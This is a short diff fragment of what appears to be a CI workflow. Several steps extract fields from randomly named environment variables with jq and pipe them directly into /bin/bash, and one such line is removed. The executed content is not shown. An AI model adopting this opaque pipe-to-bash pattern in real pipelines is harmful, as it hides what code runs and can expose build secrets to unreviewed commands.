@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$ccp14" | jq -r .xa1 | /bin/bash
           echo $nj23815 | jq -r .na4427 | /bin/bash
           printf '%s' "$wp8" | jq -r .gw95 | /bin/bash
-          echo $czo7406 | jq -r .bkay34 | /bin/bash
           echo $zi816 | jq -r .qwjff4686 | /bin/bash
 
       - name: Upload results
